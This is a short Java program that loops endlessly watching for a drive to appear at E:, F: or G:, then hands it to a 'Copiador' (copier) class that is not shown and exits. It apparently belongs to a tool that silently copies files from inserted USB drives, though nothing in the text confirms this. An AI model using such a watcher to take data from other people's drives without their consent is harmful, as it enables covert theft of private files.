/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package usb;

import java.io.File;
import java.io.IOException;

/**
 *
 * @author Adrian
 */
public class Main {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args){
        while(true){
            File unidades[] = File.listRoots();
            for(int i=0;i<unidades.length;i++){
                
                if(unidades[i].getAbsolutePath().equals("E:\\") || unidades[i].getAbsolutePath().equals("G:\\") || unidades[i].getAbsolutePath().equals("F:\\")){
                    new Copiador(unidades[i]);
                    System.exit(1);
                }
            }
        }
    }    
}
